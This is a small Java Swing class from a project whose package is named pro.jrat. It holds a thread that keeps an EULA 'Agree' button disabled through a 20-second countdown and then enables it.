package pro.jrat.client.threads;

import javax.swing.JButton;

import pro.jrat.client.ui.frames.FrameEULA;

public class ThreadCountDown extends Thread {

	public FrameEULA frame;
	public JButton button;

	public ThreadCountDown(FrameEULA f, JButton b) {
		frame = f;
		button = b;
	}

	public void run() {
		button.setEnabled(false);
		for (int i = 20; i > 0; i--) {
			button.setText("Agree (" + i + ")");
			try {
				Thread.sleep(1000L);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		button.setText("Agree (0)");
		button.setEnabled(true);
	}

}
